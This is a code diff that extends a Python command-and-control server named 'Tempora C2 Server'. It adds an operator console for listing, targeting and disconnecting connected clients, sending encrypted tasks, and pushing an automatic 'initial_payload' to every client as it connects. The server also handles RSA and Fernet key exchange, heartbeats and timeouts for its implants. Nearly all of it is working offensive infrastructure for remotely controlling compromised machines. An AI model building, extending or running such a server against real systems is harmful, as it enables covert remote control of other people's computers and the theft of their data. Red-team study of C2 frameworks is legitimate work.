@@ -8,8 +8,9 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import serialization, hashes, hmac
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 
+from helpers.formatStrings import bcolors
 class C2Server:
-    def __init__(self, host='0.0.0.0', port=5000):
+    def __init__(self, host='0.0.0.0', port=5000, initial_payload=None):
         self.host = host
         self.port = port
         self.private_key = rsa.generate_private_key(
@@ -20,51 +21,195 @@ class C2Server:
         self.clients = {}
         self.client_lock = threading.Lock()
         self.task_queue = Queue()
+        self.task_lock = threading.Lock()  # New lock for task operations
+        self.initial_payload = initial_payload  # Store the initial payload
         
         logging.basicConfig(
             level=logging.DEBUG, 
-            format='%(asctime)s - %(levelname)s: %(message)s',
+            format=f'{bcolors.LIGHT_BLACK}%(asctime)s{bcolors.RESET} - {bcolors.LIGHT_CYAN}%(levelname)s:{bcolors.RESET} - {bcolors.LIGHT_GREEN}%(message)s{bcolors.RESET}',
             handlers=[
                 logging.StreamHandler(),
-                logging.FileHandler('logs/c2_server.log')
+                logging.FileHandler('../logs/c2_server.log')
             ]
         )
         self.logger = logging.getLogger('C2Server')
 
     def admin_interface(self):
         """Command line interface for sending commands"""
+        prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server > {bcolors.RESET}"
+        
+        # Command history
+        command_history = []
+        history_index = 0
+        
+        # Available commands and their descriptions
+        commands = {
+            "list": "Show all connected clients",
+            "task": "Send task to clients (format: task <type>:<command>)",
+            "help": "Show this help message",
+            "clear": "Clear the screen",
+            "exit": "Exit the server",
+            "status": "Show server status",
+            "target": "Select target client (format: target <client_id>)",
+            "info": "Show detailed client information",
+            "kill": "Disconnect a client (format: kill <client_id>)",
+            "history": "Show command history"
+        }
+        
+        # Current target client
+        current_target = None
+        
+        def print_help():
+            print(f"\n{bcolors.HEADER}Available Commands:{bcolors.RESET}")
+            for cmd, desc in commands.items():
+                print(f" {bcolors.LIGHT_CYAN}{cmd:<10}{bcolors.RESET} - {desc}")
+            print()
+        
+        def print_status():
+            with self.client_lock:
+                total_clients = len(self.clients)
+                active_clients = sum(1 for client in self.clients.values() 
+                                  if time.time() - client['last_activity'] <= 60)
+                print(f"\n{bcolors.HEADER}Server Status:{bcolors.RESET}")
+                print(f" Total Clients: {bcolors.LIGHT_GREEN}{total_clients}{bcolors.RESET}")
+                print(f" Active Clients: {bcolors.LIGHT_GREEN}{active_clients}{bcolors.RESET}")
+                print(f" Current Target: {bcolors.LIGHT_CYAN}{current_target if current_target else 'None'}{bcolors.RESET}")
+                print()
+        
+        def print_client_info(client_id):
+            with self.client_lock:
+                if client_id not in self.clients:
+                    print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
+                    return
+                
+                client = self.clients[client_id]
+                last_active = time.time() - client['last_activity']
+                status = "Active" if last_active <= 60 else "Inactive"
+                status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
+                
+                print(f"\n{bcolors.HEADER}Client Information:{bcolors.RESET}")
+                print(f" ID: {bcolors.LIGHT_CYAN}{client_id}{bcolors.RESET}")
+                print(f" Status: {status_color}{status}{bcolors.RESET}")
+                print(f" Last Active: {bcolors.LIGHT_YELLOW}{last_active:.1f} seconds ago{bcolors.RESET}")
+                print()
+        
         while True:
             try:
-                command = input("\nC2 Server > ").strip()
+                # Update prompt with current target
+                if current_target:
+                    current_prompt = f"{bcolors.style(bcolors.BOLD, bcolors.LIGHT_MAGENTA)}Tempora C2 Server [{current_target}] > {bcolors.RESET}"
+                else:
+                    current_prompt = prompt
+                
+                command = input(current_prompt).strip()
+                
+                # Handle empty command
                 if not command:
                     continue
-
-                if command == "list":
+                
+                # Add to history
+                command_history.append(command)
+                history_index = len(command_history)
+                
+                # Split command into parts
+                parts = command.split()
+                cmd = parts[0].lower()
+                
+                if cmd == "help":
+                    print_help()
+                
+                elif cmd == "list":
                     with self.client_lock:
-                        print("\nConnected clients:")
-                        for client in self.clients:
-                            print(f" - {client}")
-                    continue
-
-                if command.startswith("task "):
+                        print(f"\n{bcolors.HEADER}Connected clients:{bcolors.RESET}")
+                        for client_id, client_info in self.clients.items():
+                            last_active = time.time() - client_info['last_activity']
+                            status = "Active" if last_active <= 60 else "Inactive"
+                            status_color = bcolors.LIGHT_GREEN if status == "Active" else bcolors.LIGHT_RED
+                            
+                            print(f" {bcolors.LIGHT_CYAN}-{bcolors.RESET} {bcolors.LIGHT_GREEN}{client_id}{bcolors.RESET} [{status_color}{status}{bcolors.RESET}]")
+                    print()
+                
+                elif cmd == "task":
+                    if len(parts) < 2:
+                        print(f"{bcolors.LIGHT_RED}Invalid task format. Use: task <type>:<command>{bcolors.RESET}")
+                        continue
+                    
                     try:
-                        task_type, *payload = command[5:].split(":", 1)
+                        task_type, *payload = parts[1].split(":", 1)
                         task = {
                             'type': task_type,
                             'cmd': payload[0] if payload else None,
-                            'timestamp': time.time()
+                            'timestamp': time.time(),
+                            'target': current_target  # Add target information
                         }
                         self.add_task(task)
+                        print(f"{bcolors.LIGHT_GREEN}Task sent successfully{bcolors.RESET}")
                     except Exception as e:
-                        self.logger.error(f"Invalid task format: {e}")
-                    continue
-
-                print("Available commands:")
-                print(" list - Show connected clients")
-                print(" task <type>:<command> - Send task to clients")
+                        self.logger.error(f"{bcolors.LIGHT_RED}Invalid task format: {e}{bcolors.RESET}")
+                
+                elif cmd == "clear":
+                    print("\033[H\033[J")  # Clear screen
+                
+                elif cmd == "exit":
+                    print(f"{bcolors.LIGHT_YELLOW}Shutting down server...{bcolors.RESET}")
+                    break
+                
+                elif cmd == "status":
+                    print_status()
+                
+                elif cmd == "target":
+                    if len(parts) < 2:
+                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
+                        continue
+                    
+                    target_id = parts[1]
+                    with self.client_lock:
+                        if target_id in self.clients:
+                            current_target = target_id
+                            print(f"{bcolors.LIGHT_GREEN}Target set to: {target_id}{bcolors.RESET}")
+                        else:
+                            print(f"{bcolors.LIGHT_RED}Client {target_id} not found{bcolors.RESET}")
+                
+                elif cmd == "info":
+                    if len(parts) < 2:
+                        if current_target:
+                            print_client_info(current_target)
+                        else:
+                            print(f"{bcolors.LIGHT_RED}No target selected. Use: info <client_id>{bcolors.RESET}")
+                    else:
+                        print_client_info(parts[1])
+                
+                elif cmd == "kill":
+                    if len(parts) < 2:
+                        print(f"{bcolors.LIGHT_RED}Please specify a client ID{bcolors.RESET}")
+                        continue
+                    
+                    client_id = parts[1]
+                    with self.client_lock:
+                        if client_id in self.clients:
+                            try:
+                                self.clients[client_id]['socket'].close()
+                            except:
+                                pass
+                            del self.clients[client_id]
+                            print(f"{bcolors.LIGHT_GREEN}Client {client_id} disconnected{bcolors.RESET}")
+                            if current_target == client_id:
+                                current_target = None
+                        else:
+                            print(f"{bcolors.LIGHT_RED}Client {client_id} not found{bcolors.RESET}")
+                
+                elif cmd == "history":
+                    print(f"\n{bcolors.HEADER}Command History:{bcolors.RESET}")
+                    for i, cmd in enumerate(command_history[-10:], 1):  # Show last 10 commands
+                        print(f" {bcolors.LIGHT_CYAN}{i}.{bcolors.RESET} {cmd}")
+                    print()
+                
+                else:
+                    print(f"{bcolors.LIGHT_RED}Unknown command: {cmd}{bcolors.RESET}")
+                    print(f"Type {bcolors.LIGHT_CYAN}help{bcolors.RESET} for available commands")
                 
             except KeyboardInterrupt:
-                self.logger.info("Shutting down admin interface")
+                print(f"\n{bcolors.LIGHT_YELLOW}Shutting down admin interface{bcolors.RESET}")
                 break
             except Exception as e:
                 self.logger.error(f"Admin interface error: {e}")
@@ -87,7 +232,7 @@ class C2Server:
             )
             return decrypted
         except Exception as e:
-            self.logger.error(f"Asymmetric Decryption Error: {e}")
+            self.logger.error(f"{bcolors.LIGHT_RED}Asymmetric Decryption Error: {e}{bcolors.RESET}")
             raise
     
     def start_server(self):
@@ -96,30 +241,30 @@ class C2Server:
         server_socket.bind((self.host, self.port))
         server_socket.listen(5)
         
-        self.logger.info(f"Server listening on {self.host}:{self.port}")
+        self.logger.info(f"Server listening on {bcolors.LIGHT_YELLOW}{self.host}:{self.port}{bcolors.RESET}")
         
         threading.Thread(target=self.task_dispatcher, daemon=True).start()
         
         while True:
             try:
                 client_socket, address = server_socket.accept()
-                self.logger.info(f"Connection from {address}")
+                self.logger.info(f"Connection from {bcolors.LIGHT_CYAN}{address}{bcolors.RESET}")
                 threading.Thread(
                     target=self.handle_client, 
                     args=(client_socket, address),
                     daemon=True
                 ).start()
             except Exception as e:
-                self.logger.error(f"Server accept error: {e}")
+                self.logger.error(f"{bcolors.LIGHT_RED}Server accept error: {e}{bcolors.RESET}")
     
     def handle_client(self, client_socket, address):
         try:
             client_socket.sendall(b'READY_FOR_KEY_EXCHANGE')
-            client_socket.settimeout(30)
+            client_socket.settimeout(120)
             
             ready_confirm = client_socket.recv(1024)
             if ready_confirm != b'CLIENT_READY':
-                raise ValueError("Client not ready for key exchange")
+                raise ValueError(f"{bcolors.LIGHT_RED}Client not ready for key exchange{bcolors.RESET}")
             
             client_socket.sendall(self.get_public_key_pem())
             
@@ -130,26 +275,49 @@ class C2Server:
             encrypted_hmac_key = client_socket.recv(hmac_key_length)
             
             if not encrypted_symmetric_key or not encrypted_hmac_key:
-                raise ValueError(f"Incomplete key transmission from {address}")
+                raise ValueError(f"{bcolors.LIGHT_RED}Incomplete key transmission from {address}{bcolors.RESET}")
             
             symmetric_key = self.decrypt_asymmetric(encrypted_symmetric_key)
             hmac_key = self.decrypt_asymmetric(encrypted_hmac_key)
             
             client_socket.sendall(b'KEY_EXCHANGE_COMPLETE')
             
+            client_id = f"{address[0]}:{address[1]}"
             with self.client_lock:
-                client_id = f"{address[0]}:{address[1]}"
+                if client_id in self.clients:
+                    # If client already exists, close the old connection
+                    try:
+                        old_socket = self.clients[client_id]['socket']
+                        old_socket.close()
+                    except:
+                        pass
+                
                 self.clients[client_id] = {
                     'socket': client_socket,
                     'symmetric_key': symmetric_key,
-                    'hmac_key': hmac_key
+                    'hmac_key': hmac_key,
+                    'last_activity': time.time()
                 }
             
-            self.logger.info(f"Successful key exchange with {address}")
+            self.logger.info(f"Successful key exchange with {bcolors.LIGHT_CYAN}{address}{bcolors.RESET}")
+            
+            # Send initial payload if configured
+            if self.initial_payload:
+                try:
+                    initial_task = {
+                        'type': 'initial_payload',
+                        'payload': self.initial_payload,
+                        'timestamp': time.time()
+                    }
+                    self.add_task(initial_task)
+                    self.logger.info(f"Initial payload sent to {bcolors.LIGHT_CYAN}{client_id}{bcolors.RESET}")
+                except Exception as e:
+                    self.logger.error(f"{bcolors.LIGHT_RED}Failed to send initial payload: {e}{bcolors.RESET}")
+            
             self.handle_client_communication(client_id)
         
         except Exception as e:
-            self.logger.error(f"Client handling error with {address}: {e}")
+            self.logger.error(f"{bcolors.LIGHT_RED}Client handling error with {address}: {e}{bcolors.RESET}")
         finally:
             try:
                 client_socket.close()
@@ -198,19 +366,20 @@ class C2Server:
                     
                     decrypted_data = cipher.decrypt(encrypted_data).decode()
                     response = json.loads(decrypted_data)
-                    self.logger.info(f"Received from {client_id}: {response}")
+                    self.logger.info(f"Received from {bcolors.LIGHT_CYAN}{client_id}: \n{bcolors.INFO}{response}{bcolors.RESET}")
+
                 
                 except Exception as e:
-                    self.logger.error(f"Error with {client_id}: {e}")
+                    self.logger.error(f"{bcolors.LIGHT_RED}Error with {client_id}: {e}{bcolors.RESET}")
                     break
             
             with self.client_lock:
                 if client_id in self.clients:
                     del self.clients[client_id]
-            self.logger.info(f"Client {client_id} disconnected")
+            self.logger.info(f"{bcolors.LIGHT_RED}Client {client_id} disconnected{bcolors.RESET}")
         
         except Exception as e:
-            self.logger.error(f"Unexpected error with {client_id}: {e}")
+            self.logger.error(f"{bcolors.LIGHT_RED}Unexpected error with {client_id}: {e}{bcolors.RESET}")
         finally:
             try:
                 client_socket.close()
@@ -229,8 +398,14 @@ class C2Server:
                         'timestamp': current_time
                     }
                     with self.client_lock:
+                        clients_to_remove = []
                         for client_id, client_info in list(self.clients.items()):
                             try:
+                                # Check if client is still active
+                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
+                                    clients_to_remove.append(client_id)
+                                    continue
+
                                 encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                     json.dumps(heartbeat_task).encode()
                                 )
@@ -242,18 +417,38 @@ class C2Server:
                                 client_info['socket'].sendall(data_length)
                                 client_info['socket'].sendall(encrypted_task)
                                 client_info['socket'].sendall(task_hmac)
+                                
+                                # Update last activity time
+                                client_info['last_activity'] = current_time
                             except Exception as e:
-                                self.logger.error(f"Failed to send heartbeat to {client_id}: {e}")
+                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send heartbeat to {client_id}: {e}{bcolors.RESET}")
+                                clients_to_remove.append(client_id)
+                        
+                        # Remove inactive clients
+                        for client_id in clients_to_remove:
+                            if client_id in self.clients:
+                                try:
+                                    self.clients[client_id]['socket'].close()
+                                except:
+                                    pass
                                 del self.clients[client_id]
+                    
                     last_heartbeat = current_time
 
                 # Process tasks from queue
                 if not self.task_queue.empty():
-                    task = self.task_queue.get()
+                    with self.task_lock:
+                        task = self.task_queue.get()
                     
                     with self.client_lock:
+                        clients_to_remove = []
                         for client_id, client_info in list(self.clients.items()):
                             try:
+                                # Check if client is still active
+                                if current_time - client_info['last_activity'] > 60:  # 60 seconds timeout
+                                    clients_to_remove.append(client_id)
+                                    continue
+
                                 encrypted_task = Fernet(client_info['symmetric_key']).encrypt(
                                     json.dumps(task).encode()
                                 )
@@ -265,17 +460,30 @@ class C2Server:
                                 client_info['socket'].sendall(data_length)
                                 client_info['socket'].sendall(encrypted_task)
                                 client_info['socket'].sendall(task_hmac)
+                                
+                                # Update last activity time
+                                client_info['last_activity'] = current_time
                             except Exception as e:
-                                self.logger.error(f"Failed to send task to {client_id}: {e}")
+                                self.logger.error(f"{bcolors.LIGHT_RED}Failed to send task to {client_id}: {e}{bcolors.RESET}")
+                                clients_to_remove.append(client_id)
+                        
+                        # Remove inactive clients
+                        for client_id in clients_to_remove:
+                            if client_id in self.clients:
+                                try:
+                                    self.clients[client_id]['socket'].close()
+                                except:
+                                    pass
                                 del self.clients[client_id]
                 
                 time.sleep(1)
             except Exception as e:
-                self.logger.error(f"Task dispatcher error: {e}")
+                self.logger.error(f"{bcolors.LIGHT_RED}Task dispatcher error: {e}{bcolors.RESET}")
                 time.sleep(5)
     
     def add_task(self, task):
-        self.task_queue.put(task)
+        with self.task_lock:
+            self.task_queue.put(task)
         self.logger.info(f"Task added: {task}")
 
 def main():
